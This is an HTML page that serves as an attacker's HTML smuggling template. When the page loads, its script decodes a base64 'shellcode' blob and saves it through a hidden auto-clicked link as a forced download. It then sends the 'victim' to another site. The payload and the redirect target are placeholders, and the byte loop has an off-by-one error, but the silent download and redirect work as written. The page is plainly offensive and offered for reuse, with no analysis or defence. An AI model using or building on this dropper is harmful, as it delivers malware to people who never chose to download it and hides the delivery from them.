<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        function base64ToArrayBuffer(base64) {
            var bin_str = window.atob(base64);
            var len = bin_str.length;
            var arr_bytes = new Uint8Array(len);

            for (var i = 0; i <= len; i++) {
                arr_bytes[i] = bin_str.charCodeAt(i);

            }

            return arr_bytes.buffer;

        }

        var sc = `

            Shellcode encoded in base64 here !

        `;

        var data = base64ToArrayBuffer(sc)

        var blob = new Blob([data], {type: 'octet/string'});

        var a = document.createElement("a");
        document.body.appendChild(a);
        
        a.style = "display: none";

        var url = window.URL.createObjectURL(blob);
        a.href = url;

        a.download = "Name of your shellcode file";
        a.click()

        window.URL.revokeObjectURL(url)
        window.location.href = "Place the website to redirect the victim";

    </script>
</body>
</html>
